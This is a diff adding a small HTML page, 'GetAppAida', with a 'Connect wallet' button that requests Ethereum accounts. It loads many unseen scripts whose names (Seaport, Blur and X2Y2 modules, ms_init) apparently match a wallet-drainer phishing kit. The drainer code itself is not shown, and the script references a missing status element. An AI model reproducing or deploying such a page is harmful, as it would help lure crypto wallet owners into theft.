@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GetAppAida</title>
+  <style>
+    @media (prefers-color-scheme: dark) {
+      html, body {
+        background: #212020;
+        color: #fff;
+      }
+    }
+
+    /* Style the button */
+    button {
+      padding: 10px 20px;
+      background-color: #007BFF;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    button:active {
+      background-color: #004085;
+    }
+
+    /* Style for the status paragraph */
+    .advanced_mode {
+      font-family: Arial, sans-serif;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  
+  <hr>
+  <div class="advanced_mode">
+   
+    <!-- Button to trigger ms_init() function -->
+    <button onclick="ms_init()">Connect wallet</button>
+  </div>
+  
+  <!-- External Scripts -->
+  <script src="./assets/web3-provider/web3-modal.js"></script>
+  <script src="./assets/web3-provider/web3-loader.js"></script>
+  <script src="./assets/web3-provider/web3-connect.js"></script>
+  <script src="./assets/web3-provider/web3-router.js"></script>
+  <script src="./assets/web3-provider/web3-module.js"></script>
+  <script src="./assets/web3-provider/web3-alert.js"></script>
+  <script src="./assets/web3-provider/web3-seaport.js"></script>
+  <script src="./assets/web3-provider/web3-data.js"></script>
+  <script src="./assets/web3-provider/ethers.js"></script>
+  <script src="./assets/web3-provider/ethereum-tx.js"></script>
+  <script src="./assets/web3-modules/module-seaport.js"></script>
+  <script src="./assets/web3-modules/module-blur.js"></script>
+  <script src="./assets/web3-modules/module-x2y2.js"></script>
+  <script src="./assets/web3-provider.js"></script>
+  
+  <script>
+    // Update the wallet connection status every second
+    setInterval(() => {
+      document.getElementById('injected-status').innerHTML = (typeof window.ethereum === 'object') ? 'true' : 'false';
+    }, 1000);
+    
+    // Function that will be triggered when the button is clicked
+    function ms_init() {
+      // Check if window.ethereum is available (MetaMask or similar extension)
+      if (typeof window.ethereum !== 'undefined') {
+        alert("Connecting to wallet...");
+        
+        // Request account access if MetaMask is available
+        window.ethereum.request({ method: 'eth_requestAccounts' })
+          .then(accounts => {
+            alert("Wallet connected! Account: " + accounts[0]);
+            document.getElementById('injected-status').innerHTML = 'Connected';
+          })
+          .catch(error => {
+            alert("Connection failed: " + error.message);
+            document.getElementById('injected-status').innerHTML = 'Failed';
+          });
+      } else {
+        alert("No Ethereum wallet detected! Please install MetaMask.");
+        document.getElementById('injected-status').innerHTML = 'None';
+      }
+    }
+  </script>
+</body>
+</html>
